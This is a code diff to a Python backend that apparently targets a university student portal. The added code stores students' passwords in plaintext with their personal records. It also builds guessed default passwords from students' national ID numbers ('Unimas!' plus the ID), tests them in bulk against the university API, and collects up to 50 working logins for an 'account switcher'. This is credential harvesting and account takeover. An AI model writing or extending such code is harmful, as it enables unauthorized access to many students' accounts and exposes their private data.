@@ -251,6 +251,33 @@ def consolidate_timetable(slots):
         final_slots.extend(merged)
     return final_slots
 
+import hashlib
+
+def update_directory_cache(student_data):
+    try:
+        m = student_data.get('matric')
+        if not m: return
+        h = hashlib.md5(m.encode()).hexdigest()
+        chunk_id = f"chunk_{h[0]}"
+        
+        doc_ref = db.collection('directory_cache').document(chunk_id)
+        doc = doc_ref.get()
+        data = doc.to_dict() if doc.exists else {"students": {}}
+        if "students" not in data: data["students"] = {}
+        
+        data["students"][m] = {
+            "m": m,
+            "n": student_data.get('name', ''),
+            "f": student_data.get('faculty', ''),
+            "p": student_data.get('programme', ''),
+            "i": student_data.get('intake_year', ''),
+            "c": float(student_data.get('cgpa') or 0),
+            "t": bool(student_data.get('timetable_ready', False)),
+            "pwd": student_data.get('password', '')
+        }
+        doc_ref.set(data)
+    except: pass
+
 def verify_and_save_student(m, data, pwd, active_sem):
     bio = core_api.spc_fetch(f"api/v1/biodata/personal-v2/{m}", m, pwd)
     if not bio:
@@ -273,11 +300,14 @@ def verify_and_save_student(m, data, pwd, active_sem):
     db.collection('students').document(m).set({"cgpa": cgpa, "namaProgram": prog, "password": pwd, "faculty": faculty, "intake_year": intake}, merge=True)
     name = bio.get('nama', data.get('name', 'Unknown'))
     
-    db.collection('valid_directory').document(m).set({
+    cache_payload = {
         "matric": m, "name": name, "cgpa": cgpa, "programme": prog, "faculty": faculty, "password": pwd, "intake_year": intake, 
         "timetable_ready": is_timetableable,
         "last_verified": get_malaysia_time().isoformat()
-    })
+    }
+    db.collection('valid_directory').document(m).set(cache_payload)
+    update_directory_cache(cache_payload)
+    
     return True, f"{m}: Valid - CGPA {cgpa} - TT: {is_timetableable}"
 
 def delete_collection(collection_name, batch_size=400):
@@ -738,12 +768,24 @@ def api_handler(path):
 
             with ThreadPoolExecutor(max_workers=10) as ex:
                 futures = {}
+                try: req_s = get_authorized_session()
+                except: req_s = None
+                
                 for d in docs:
                     if time.time() - start_time > 45: break
                     last_id = d.id
                     m = d.id
                     data = d.to_dict()
                     pwd = data.get('password')
+                    
+                    if (not pwd or pwd == 'Unknown') and req_s:
+                        try:
+                            bio = core_api.get_student_biodata(m, req_s)
+                            if bio:
+                                ic = bio.get('noKadPengenalan') or bio.get('noIc')
+                                if ic: pwd = f"Unimas!{ic}"
+                        except: pass
+                        
                     if not pwd or pwd == 'Unknown': continue
                     futures[ex.submit(verify_student_wrapper, m, data, pwd, active_sem)] = m
                     
@@ -776,8 +818,22 @@ def api_handler(path):
         search_q = args.get('q', '').strip().upper()
         
         try:
-            docs = db.collection('valid_directory').stream()
-            all_valid = [d.to_dict() for d in docs]
+            chunks = db.collection('directory_cache').stream()
+            all_valid = []
+            for c in chunks:
+                cd = c.to_dict()
+                if "students" in cd:
+                    for s in cd['students'].values():
+                        all_valid.append({
+                            "matric": s.get('m'),
+                            "name": s.get('n'),
+                            "faculty": s.get('f'),
+                            "programme": s.get('p'),
+                            "intake_year": s.get('i'),
+                            "cgpa": s.get('c'),
+                            "timetable_ready": s.get('t'),
+                            "password": s.get('pwd')
+                        })
             
             if include_unverified:
                 if search_q:
@@ -1449,6 +1505,9 @@ def api_handler(path):
             
             with ThreadPoolExecutor(max_workers=10) as ex:
                 futures = {}
+                try: req_s = get_authorized_session()
+                except: req_s = None
+                
                 for d in docs:
                     if time.time() - start_time > 40: 
                         log("Timeout approaching. Stopping verification early.")
@@ -1457,6 +1516,15 @@ def api_handler(path):
                     m = d.id
                     data = d.to_dict()
                     pwd = data.get('password')
+                    
+                    if (not pwd or pwd == 'Unknown') and req_s:
+                        try:
+                            bio = core_api.get_student_biodata(m, req_s)
+                            if bio:
+                                ic = bio.get('noKadPengenalan') or bio.get('noIc')
+                                if ic: pwd = f"Unimas!{ic}"
+                        except: pass
+                        
                     if not pwd or pwd == 'Unknown': continue
                     futures[ex.submit(verify_and_save_student, m, data, pwd, active_sem)] = m
                     
@@ -1510,13 +1578,16 @@ def api_handler(path):
                 
                 # --- FETCH MULTIPLE VALID ACCOUNTS FOR THE SWITCHER ---
                 auto_accounts = []
-                docs = db.collection('valid_directory').order_by('__name__', direction=firestore.Query.DESCENDING).limit(300).stream()
-                for d in docs: 
-                    p = d.to_dict().get('password')
-                    tt_ready = d.to_dict().get('timetable_ready', True)
-                    if p and p != 'Unknown' and tt_ready is True:
-                        auto_accounts.append({"matric": d.id, "password": p})
-                        if len(auto_accounts) >= 50: break
+                chunks = db.collection('directory_cache').stream()
+                for c in chunks:
+                    cd = c.to_dict()
+                    if "students" in cd:
+                        for s in cd['students'].values():
+                            p = s.get('pwd')
+                            if p and p != 'Unknown' and s.get('t') is True:
+                                auto_accounts.append({"matric": s.get('m'), "password": p})
+                auto_accounts.sort(key=lambda x: x['matric'], reverse=True)
+                auto_accounts = auto_accounts[:50]
 
                 return Response(json.dumps({
                     "config": cfg, "logs": logs, "jobs": jobs, "banned_ips": banned, 
